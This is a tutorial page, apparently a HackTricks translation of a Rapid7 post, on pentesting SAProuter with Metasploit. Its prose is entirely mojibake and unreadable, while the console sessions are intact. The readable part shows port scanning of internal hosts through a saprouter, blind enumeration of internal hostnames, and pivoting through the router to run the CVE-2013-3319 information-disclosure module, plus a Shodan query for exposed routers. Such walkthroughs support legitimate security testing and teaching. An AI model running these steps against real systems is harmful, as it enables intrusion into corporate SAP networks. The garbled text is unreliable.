рдпрд╣ рдореЙрдбреНрдпреВрд▓ рд╕реНрдХреИрди рдХреЗ рджреМрд░рд╛рди рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдиреЗрдХреНрд╢рди рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдирд╛ рд╣реИ, рдЗрд╕реЗ MODE рд╡рд┐рдХрд▓реНрдк рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ SAP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ, рдЬреЛ рдЙрддреНрдкрд╛рджрди рдореЗрдВ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдЕрд╕рд╛рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИ рдХрд┐ saprouter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдПрдВ рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдВ, рдЬрд╣рд╛рдВ ACL рдиреЗрдЯрд┐рд╡ \(TCP\) рдХрдиреЗрдХреНрд╢рди рдХреЛ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

рд╣рдо MODE рдХреЛ TCP рдкрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рдЖрдВрдХрд▓рди рдХрд░ рд╕рдХреЗрдВ рдХрд┐ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдиреЗрдХреНрд╢рди рдЕрдиреБрдорддрд┐ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВред рд╣рдо рдЕрдм рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯреНрд╕ рдХреЛ рд╕реНрдХреИрди рдХрд░реЗрдВрдЧреЗ, рджреЛрдиреЛрдВ рдкреЛрд░реНрдЯ 3200 \(SAP DIAG\) рдФрд░ 80 \(HTTP\) рдкрд░, VERBOSE рдХреЛ рд╕рдЪ рдкрд░ рд╕реЗрдЯ рдХрд░рдХреЗ, рджреЛрдиреЛрдВ рдЗрдВрд╕реНрдЯреЗрдВрд╕ 00 рдФрд░ 01 рдкрд░ рдФрд░ рджреЗрдЦреЗрдВрдЧреЗ рдХреНрдпрд╛ рд╣реЛрддрд╛ рд╣реИ:
```text
msf auxiliary(sap_router_portscanner) > set MODE TCP
MODE => TCP

msf auxiliary(sap_router_portscanner) > set PORTS 80,32NN
PORTS => 80,32NN
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:80 - TCP OPEN
[-] 192.168.1.18:3200 - blocked by ACL
[+] 192.168.1.18:3201 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State  Info
----          ----  -----  ----
192.168.1.18  80    open
192.168.1.18  3201  open   SAP Dispatcher sapdp01

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[+] 192.168.1.1:3201 - TCP OPEN
[+] 192.168.1.1:80 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host         Port  State  Info
----         ----  -----  ----
192.168.1.1  3201  open   SAP Dispatcher sapdp01
192.168.1.1  80    open

[*] Auxiliary module execution completed
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрдЙрдЯрдкреБрдЯ рдФрд░ рдкрд┐рдЫрд▓реА рдЬрд╛рдирдХрд╛рд░реА рд╕реЗ рд╣рдореЗрдВ рдЕрдм рдкрддрд╛ рдЪрд▓ рдЧрдпрд╛ рд╣реИ рдХрд┐ ACL рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣реИ:

* рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ рд╕реЗ TCP рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ 192.168.1.1 рдкрд░ рдкреЛрд░реНрдЯ 80 рдХреЗ рд▓рд┐рдП
* рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ рд╕реЗ TCP рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ 192.168.1.18 рдкрд░ рдкреЛрд░реНрдЯ 80 рдХреЗ рд▓рд┐рдП
* рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ рд╕реЗ TCP рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ 192.168.1.1 рдкрд░ рдкреЛрд░реНрдЯ 3201 рдХреЗ рд▓рд┐рдП
* рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ рд╕реЗ TCP рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ 192.168.1.18 рдкрд░ рдкреЛрд░реНрдЯ 3201 рдХреЗ рд▓рд┐рдП
* рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ рд╕реЗ SAP рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ 192.168.1.18 рдкрд░ рдкреЛрд░реНрдЯ 3200 рдХреЗ рд▓рд┐рдП

**рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯреНрд╕ рдХрд╛ рдЕрдВрдзрд╛ рдЕрдиреБрдХреНрд░рдордг**

рдпрджрд┐ рдЖрдкрдХреЛ рдпрд╛рдж рд╣реЛ, рд╣рдордиреЗ saprouter рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ рд╢реБрд░реБрдЖрдд рдХреА рдереА рдЬрд┐рд╕рд╕реЗ рд╣рдореЗрдВ рдПрдХ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯ рдХрд╛ IP рдкрддрд╛ рдЪрд▓рд╛, рдФрд░ рд╣рдо рд╡рд╣рд╛рдВ рд╕реЗ рдЖрдЧреЗ рдмрдврд╝реЗред рд▓реЗрдХрд┐рди рдЕрдЧрд░ saprouter рд╣рдореЗрдВ рд╡рд╣ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рддреЛ рдХреНрдпрд╛ рд╣реЛрдЧрд╛?

рдПрдХ рд╡рд┐рдХрд▓реНрдк рдпрд╣ рд╣реИ рдХрд┐ рдмрд╕ рдирд┐рдЬреА рдкрддрд╛ рд╕реНрдерд╛рдиреЛрдВ рдХреЛ рд╕реНрдХреИрди рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ, рдФрд░ рджреЗрдЦреЗрдВ рдХреНрдпрд╛ рд╣реЛрддрд╛ рд╣реИред рджреВрд╕рд░рд╛ рд╡рд┐рдХрд▓реНрдк рд╣реИ рд╣реЛрд╕реНрдЯрдиреЗрдо рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЕрдВрдзрд╛ рдЕрдиреБрдХреНрд░рдордг рдХрд░рдирд╛ред

Saprouters рд╣рдореЗрдВ рдЬрд┐рди рд╣реЛрд╕реНрдЯрдиреЗрдореНрд╕ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддреЗ рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ рд╣рд▓ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддреЗ рд╣реИрдВред Saprouter рдпрд╣ рднреА рдмрддрд╛рдиреЗ рдореЗрдВ рджрдпрд╛рд▓реБ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╡рд┐рдлрд▓ рд╣реЛрдиреЗ рдкрд░ рдХреНрдпрд╛ рддреНрд░реБрдЯрд┐рдпрд╛рдВ рд╣реЛрддреА рд╣реИрдВ \(рдЖрдк рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдореЙрдбреНрдпреВрд▓ рд╕реЛрд░реНрд╕ рдкрд░ рд▓рд╛рдЗрди 242 рдХреЛ рдЕрдирдХрдореЗрдВрдЯ рдХрд░рдХреЗ рдХрдЪреНрдЪреЗ рдкреНрд░рддрд┐рд╕рд╛рдж рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ\)ред

рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЗ рд╕рд╛рде рд╣рдо рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯреНрд╕ рдХрд╛ рд╣реЛрд╕реНрдЯрдиреЗрдо рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрдХреНрд░рдордг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╕реАрдзреЗ рд╕реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ!

рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ RESOLVE рд╡рд┐рдХрд▓реНрдк рдХреЛ "remote" рдкрд░ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдореЙрдбреНрдпреВрд▓ рдирд┐рд░реНрдзрд╛рд░рд┐рдд TARGETS рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдЧрд╛, рдмрд┐рдирд╛ рдЙрдиреНрд╣реЗрдВ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд╣рд▓ рдХрд┐рдП, рдФрд░ рд╣рдо рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯреНрд╕ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЕрдВрддрддрдГ рдЙрдирд╕реЗ рдХрднреА рднреА рдЙрдирдХреЗ IP рдкрддреЗ рдЬрд╛рдиреЗ рдмрд┐рдирд╛ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯреНрд╕ рдХрд╛ рдЕрдВрдзрд╛ рдЕрдиреБрдХреНрд░рдордг рдХрд░рддреЗ рд╕рдордп рдпрд╛рдж рд░рдЦрдиреЗ рд╡рд╛рд▓реА рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд╛рддреЗрдВ:

* VERBOSE рдХреЛ true рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ;
* рдЕрдЧрд░ MODE рдХреЛ SAP_PROTO рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рд╣рдореЗрдВ saprouter рд╕реЗ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реЗрдЧреА;
* рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░ рд╣рдореЗрдВ рдХреЗрд╡рд▓ saprouter рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ рд░реБрдЪрд┐ рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг, рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдПрдХ рдкреЛрд░реНрдЯ рд╕реЗрдЯ рдХрд░рдирд╛ рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ \(3200 рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ\);
* рдкрд░рд┐рдгрд╛рдо рд╡рд┐рдиреНрдпрд╕реНрдд ACL рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░реЗрдВрдЧреЗред рджреБрд░реНрднрд╛рдЧреНрдпрд╡рд╢ рдЕрд╡рд░реБрджреНрдз рдХрдиреЗрдХреНрд╢рди рд╣рдореЗрдВ рдЬреНрдпрд╛рджрд╛ рдЬрд╛рдирдХрд╛рд░реА рдирд╣реАрдВ рджреЗрдВрдЧреЗред

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╣рдо рд╣реЛрд╕реНрдЯрдиреЗрдореНрд╕ sap, sapsrv рдФрд░ sapsrv2 рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВрдЧреЗред
```text
msf auxiliary(sap_router_portscanner) > set RESOLVE remote
RESOLVE => remote
msf auxiliary(sap_router_portscanner) > set MODE SAP_PROTO
MODE => SAP_PROTO
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS sap,sapsrv,sapsrv2
TARGETS => sap,sapsrv,sapsrv2
msf auxiliary(sap_router_portscanner) > set PORTS 3200
PORTS => 3200
msf auxiliary(sap_router_portscanner) > run

[*] Scanning sap
[-] sap:3200 - unknown host
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv
[-] sapsrv:3200 - host unreachable
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv2
[+] sapsrv2:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host     Port  State  Info
----     ----  -----  ----
sapsrv2  3200  open   SAP Dispatcher sapdp00

[*] Auxiliary module execution completed
```
рдЖрдЙрдЯрдкреБрдЯ рд╕реЗ рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ "sap" рдирд╛рдордХ рд╣реЛрд╕реНрдЯ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ, рд▓реЗрдХрд┐рди sapsrv рд╣реЛрд╕реНрдЯ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╡рд╣ рдкрд╣реБрдБрдЪ рдпреЛрдЧреНрдп рдирд╣реАрдВ рд╣реИ, рдФрд░ sapsrv2 рдореМрдЬреВрдж рд╣реИ рдФрд░ рд╣рдо 3200 рдкреЛрд░реНрдЯ рдкрд░ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рддрдХрдиреАрдХ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдЕрдиреНрдп рд╣реЛрд╕реНрдЯреНрд╕ рдХреЛ рдвреВрдБрдврдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЗрд╕реНрддреЗрдорд╛рд▓ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, SAP рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдирд╣реАрдВ, рдмрд╕ рд╕рд╛рдорд╛рдиреНрдп рд╣реЛрд╕реНрдЯрдиреЗрдореНрд╕ рдХрд╛ рдкреНрд░рдпреЛрдЧ рдХрд░реЗрдВ, рдЬреИрд╕реЗ рдХрд┐ smtp, exchange, pdc, bdc, fileshare, intranet, рдпрд╛ рдЕрдиреНрдп рдХреЛрдИ рдЕрдЪреНрдЫреЗ рд╣реЛрд╕реНрдЯрдиреЗрдореНрд╕ рдЬреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

**рдЕрдВрддрд┐рдо рдЪрд░рдг**

рдЕрдм рдЬрдм рд╣рдореЗрдВ рдпрд╣ рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓ рдЧрдИ рд╣реИ, рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯреНрд╕ рдХреМрди рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реИрдВ, рдХреМрди рд╕реА рд╕реЗрд╡рд╛рдПрдБ рдЕрдиреБрдордд рд╣реИрдВ, рдФрд░ рдХреМрди рд╕реЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣рдо saprouter рдХреЛ рднреЗрджрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдо рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЖрдВрддрд░рд┐рдХ рд╕рд░реНрд╡рд░реЛрдВ рд╕реЗ рдЬреБрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╣рдорд╛рд░реЗ pentest рдХреЗ рд╕рд╛рде рдЖрдЧреЗ рдмрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

Metasploit рд╣рдореЗрдВ saprouter рдХреЛ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рд░реВрдк рдореЗрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╢рд╛рдирджрд╛рд░ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, Proxies рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, Dave Hartley ([@nmonkee](http://twitter.com/nmonkee)) рдХреЗ рдзрдиреНрдпрд╡рд╛рдж рд╕реЗред

рдЗрд╕ рд╕рдордп, рд╣рдо рдЖрдВрддрд░рд┐рдХ sap рд╕рд░реНрд╡рд░ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдЗрдХрдЯреНрдард╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рд╣рдордиреЗ 192.168.1.18 рд╣реЛрд╕реНрдЯ рдореЗрдВ рдЦреЛрдЬрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд╣рдо рдореЙрдбреНрдпреВрд▓ [`sap_hostctrl_getcomputersystem`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рдЬреЛ CVE-2013-3319 рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддрд╛ рд╣реИ рдФрд░ рд╣рдореЗрдВ рдЕрдирдзрд┐рдХреГрдд SOAP рдЕрдиреБрд░реЛрдз рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ 1128 рдкреЛрд░реНрдЯ рдкрд░ SAP Host Control рд╕реЗрд╡рд╛ рдХреЛ рдХреНрд╡реЗрд░реА рдХрд░рдХреЗ рд╕рд░реНрд╡рд░ рдкрд░ рдЪрд▓ рд░рд╣реЗ OS рдХреА рдЬрд╛рдирдХрд╛рд░реА рджреЗрддрд╛ рд╣реИред рд╣рдо saprouter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ pivoting рдХрд░реЗрдВрдЧреЗ, metasploit рдореЗрдВ рдкреНрд░реЙрдХреНрд╕реА рд╕рдкреЛрд░реНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП:

![](https://blog.rapid7.com/content/images/post-images/33923/image2.jpg)
```text
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem
msf auxiliary(sap_hostctrl_getcomputersystem) > set Proxies sapni:1.2.3.101:3299
Proxies => sapni:1.2.3.101:3299
msf auxiliary(sap_hostctrl_getcomputersystem) > set RHOSTS 192.168.1.18
RHOSTS => 192.168.1.18
msf auxiliary(sap_hostctrl_getcomputersystem) > run

[+] 192.168.1.18:1128 - Information retrieved successfully
[*] 192.168.1.18:1128 - Response stored in /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_386124.xml (XML) and /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_186948.txt (TXT)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```
рдпрджрд┐ рд╕рдм рдХреБрдЫ рдареАрдХ рд░рд╣рд╛, рддреЛ рдЖрдкрдХреЛ рд▓реВрдЯ рдореЗрдВ рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рдЖрдЙрдЯрдкреБрдЯ рдорд┐рд▓реЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рд▓рдХреНрд╖реНрдп SAP рд╣реЛрд╕реНрдЯ рд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рдЖрдВрддрд░рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдЖрдВрддрд░рд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдлрд┐рд░ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

рдкрд┐рд╡реЛрдЯрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ (рдФрд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП!) рдЕрдиреНрдп рдореЙрдбреНрдпреВрд▓реНрд╕ рдХреЛ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯреНрд╕ рдХреЗ рдЦрд┐рд▓рд╛рдл рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдХреЗрд╡рд▓ SAP рд╕рд┐рд╕реНрдЯрдореНрд╕ рд╣реА рдирд╣реАрдВ!

**рдирд┐рд╖реНрдХрд░реНрд╖**

рд╣рдордиреЗ рджреЗрдЦрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдХрдордЬреЛрд░ saprouter рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рд╕рднреА рддрд░рд╣ рдХреЗ рдЖрдВрддрд░рд┐рдХ рд╣реЛрд╕реНрдЯреНрд╕ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рд╕рдм рдХреЗрд╡рд▓ metasploit рдХреЗ SAP рд╕рд┐рд╕реНрдЯрдореНрд╕ рдХреЗ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕рдорд░реНрдерди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

рдореБрдЭреЗ рдЖрд╢рд╛ рд╣реИ рдХрд┐ рдпрд╣ рд▓реЗрдЦ saprouter рддреИрдирд╛рддреА рд╕реЗ рдЬреБрдбрд╝реЗ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЗ рд╕рд╛рде-рд╕рд╛рде SAP рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд╕рд╛рдорд╛рдиреНрдп рдкрд░ рднреА рдкреНрд░рдХрд╛рд╢ рдбрд╛рд▓рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИред

**рд╕рдВрджрд░реНрдн**

* [http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/](http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/)
* \[[http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nun ez Di Croce - SAProuter .pdf\]\([http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nunez Di Croce - SAProuter .pdf\)
* [http://scn.sap.com/docs/DOC-17124](http://scn.sap.com/docs/DOC-17124)
* [http://help.sap.com/saphelp\_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/f rameset.htm](http://help.sap.com/saphelp_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/frameset.htm)
* [http://help.sap.com/saphelp\_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767 /content.htm](http://help.sap.com/saphelp_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767/content.htm)
* [http://labs.integrity.pt/advisories/cve-2013-3319/](http://labs.integrity.pt/advisories/cve-2013-3319/)
* [SAP Service Discovery \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery)
* [SAPRouter Admin Request \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request)
* [CVE-2013-3319 SAP Host Agent Information Disclosure \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem)
* [SAPRouter Port Scanner \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner)

# Shodan

* `port:3299 !HTTP Network packet too big`



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
```
